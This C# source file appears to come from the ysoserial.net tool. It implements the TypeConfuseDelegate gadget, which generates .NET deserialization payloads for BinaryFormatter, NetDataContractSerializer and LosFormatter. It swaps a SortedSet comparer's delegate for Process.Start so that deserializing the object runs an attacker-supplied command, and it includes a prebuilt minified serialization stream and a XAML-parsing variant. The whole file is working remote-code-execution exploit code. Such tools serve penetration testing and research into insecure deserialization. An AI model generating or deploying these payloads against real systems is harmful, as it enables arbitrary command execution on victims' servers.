using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using ysoserial.Helpers;
using ysoserial.Helpers.ModifiedVulnerableBinaryFormatters;

namespace ysoserial.Generators
{
    public class TypeConfuseDelegateGenerator : GenericGenerator
    {
        public override string Name()
        {
            return "TypeConfuseDelegate";
        }

        public override string Finders()
        {
            return "James Forshaw";
        }

        public override string Contributors()
        {
            return "Alvaro Munoz";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.NotBridgeNotDerived };
        }


        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            if(inputArgs.Minify && inputArgs.UseSimpleType && 
                (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase) || formatter.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase)))
            {
                // This is to provide even a smaller payload
                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
                
                string tcd_json_minified = @"[{'Id': 1,
    'Data': {
      '$type': 'SerializationHeaderRecord',
      'binaryFormatterMajorVersion': 1,
      'binaryFormatterMinorVersion': 0,
      'binaryHeaderEnum': 0,
      'topId': 1,
      'headerId': -1,
      'majorVersion': 1,
      'minorVersion': 0
}},{'Id': 2,
    'TypeName': 'Assembly',
    'Data': {
      '$type': 'BinaryAssembly',
      'assemId': 2,
      'assemblyString': 'System'
}},{'Id': 3,
    'TypeName': 'ObjectWithMapTypedAssemId',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 5,
      'objectId': 1,
      'name': 'System.Collections.Generic.SortedSet`1[[System.String,mscorlib]]',
      'numMembers': 4,
      'memberNames':['Count','Comparer','Version','Items'],
      'binaryTypeEnumA':[0,1,0,1],
      'typeInformationA': null,
      'typeInformationB':[8,null,8,null],
      'memberAssemIds':[0,0,0,0],
      'assemId': 2
}},{'Id': 4,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 2
}},{'Id': 5,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 3
}},{'Id': 6,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 0
}},{'Id': 7,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 4
}},{'Id': 8,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 3,
      'name': 'System.Collections.Generic.ComparisonComparer`1[[System.String]]',
      'numMembers': 1,
      'memberNames':['_comparison'],
      'binaryTypeEnumA':[1],
      'typeInformationA': null,
      'typeInformationB':[null],
      'memberAssemIds':[0],
      'assemId': 0
}},{'Id': 9,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 5
}},{'Id': 10,
    'TypeName': 'ArraySingleString',
    'Data': {
      '$type': 'BinaryArray',
      'objectId': 4,
      'rank': 0,
      'lengthA':[2],
      'lowerBoundA': null,
      'binaryTypeEnum': 0,
      'typeInformation': null,
      'assemId': 0,
      'binaryHeaderEnum': 17,
      'binaryArrayTypeEnum': 0
}},{'Id': 11,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 6,
      'value': '" + inputArgs.CmdArguments + @"'
}},{'Id': 12,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 7,
      'value': '" + inputArgs.CmdFileName + @"'
}},{'Id': 13,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 5,
      'name': 'System.DelegateSerializationHolder',
      'numMembers': 3,
      'memberNames':['Delegate','','x'],
      'binaryTypeEnumA':[1,1,1],
      'typeInformationA': null,
      'typeInformationB':[null,null,null],
      'memberAssemIds':[0,0,0],
      'assemId': 0
}},{'Id': 14,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 8
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 17,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 8,
      'name': 'System.DelegateSerializationHolder+DelegateEntry',
      'numMembers': 7,
      'memberNames':['type','assembly','','targetTypeAssembly','targetTypeName','methodName','delegateEntry'],
      'binaryTypeEnumA':[1,1,1,1,1,1,1],
      'typeInformationA': null,
      'typeInformationB':[null,null,null,null,null,null,null],
      'memberAssemIds':[0,0,0,0,0,0,0],
      'assemId': 0
}},{'Id': 18,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 11,
      'value': 'System.Func`3[[System.String],[System.String],[System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089]]'
}},{'Id': 19,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 12,
      'value': 'mscorlib'
}},{'Id': 20,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 21,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 13,
      'value': 'System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089'
}},{'Id': 22,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 14,
      'value': 'System.Diagnostics.Process'
}},{'Id': 23,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 15,
      'value': 'Start'
}},{'Id': 24,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 16
}},{'Id': 25,
    'TypeName': 'ObjectWithMapTyped',
    'Data': {
      '$type': 'BinaryObjectWithMapTyped',
      'binaryHeaderEnum': 4,
      'objectId': 9,
      'name': 'x',
      'numMembers': 7,
      'memberNames':['','','','','','',''],
      'binaryTypeEnumA':[1,1,1,1,1,0,1],
      'typeInformationA': null,
      'typeInformationB':[null,null,null,null,null,8,null],
      'memberAssemIds':[0,0,0,0,0,0,0],
      'assemId': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 31,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 0
}},{'Id': 33,
    'TypeName': 'Object',
    'Data': {
      '$type': 'BinaryObject',
      'objectId': 10,
      'mapId': 9
}},{'Id': 34,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 22,
      'value': 'Compare'
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 36,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 24,
      'value': 'System.String'
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 0,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 39,
    'TypeName': 'Int32',
    'IsPrimitive': true,
    'Data': {
      '$type': 'MemberPrimitiveUnTyped',
      'typeInformation': 8,
      'value': 0
}},{'Id': 40,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 41,
    'TypeName': 'Object',
    'Data': {
      '$type': 'BinaryObject',
      'objectId': 16,
      'mapId': 8
}},{'Id': 42,
    'TypeName': 'ObjectString',
    'Data': {
      '$type': 'BinaryObjectString',
      'objectId': 27,
      'value': 'System.Comparison`1[[System.String]]'
}},{'Id': 43,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 12
}},{'Id': 44,
    'TypeName': 'ObjectNull',
    'Data': {
      '$type': 'ObjectNull',
      'nullCount': 0
}},{'Id': 45,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 12
}},{'Id': 46,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 24
}},{'Id': 47,
    'TypeName': 'MemberReference',
    'Data': {
      '$type': 'MemberReference',
      'idRef': 22
}},{'Id': 49,
    'TypeName': 'MessageEnd',
    'Data': {
      '$type': 'MessageEnd'
}}]";

                MemoryStream ms_bf = AdvancedBinaryFormatterParser.JsonToStream(tcd_json_minified);
                if(formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
                {
                    //BinaryFormatter
                    if (inputArgs.Test)
                    {
                        try
                        {
                            ms_bf.Position = 0;
                            SerializersHelper.BinaryFormatter_deserialize(ms_bf);
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return ms_bf.ToArray();
                }
                else
                {
                    // LosFormatter
                    MemoryStream ms_lf = SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(ms_bf);

                    if (inputArgs.Test)
                    {
                        try
                        {
                            ms_bf.Position = 0;
                            SerializersHelper.LosFormatter_deserialize(ms_lf.ToArray());
                        }
                        catch (Exception err)
                        {
                            Debugging.ShowErrors(inputArgs, err);
                        }
                    }
                    return ms_lf.ToArray();
                }
            }
            else
            {
                return Serialize(TypeConfuseDelegateGadget(inputArgs), formatter, inputArgs);
            }
        }

        /* this can be used easily by the plugins as well */

        // This is for those plugins that only accepts cmd and do not want to use any of the input argument features such as minification
        public static object TypeConfuseDelegateGadget(string cmd)
        {
            InputArgs inputArgs = new InputArgs();
            inputArgs.Cmd = cmd;
            return TypeConfuseDelegateGadget(inputArgs);
        }

        public static object TypeConfuseDelegateGadget(InputArgs inputArgs)
        {
            string cmdFromFile = inputArgs.CmdFromFile;

            if (!string.IsNullOrEmpty(cmdFromFile))
            {
                inputArgs.Cmd = cmdFromFile;
            }
            
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add(inputArgs.CmdFileName);
            if (inputArgs.HasArguments)
            {
                set.Add(inputArgs.CmdArguments);
            }
            else
            {
                set.Add("");
            }
            
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);

            return set;
        }
        
        public static object GetXamlGadget(string xaml_payload)
        {
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add(xaml_payload);
            set.Add("");
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // We use XamlReader.Parse() to trigger the xaml execution
            invoke_list[1] = new Func<string, object>(System.Windows.Markup.XamlReader.Parse);
            fi.SetValue(d, invoke_list);
            return set;
        }
        
    }
}
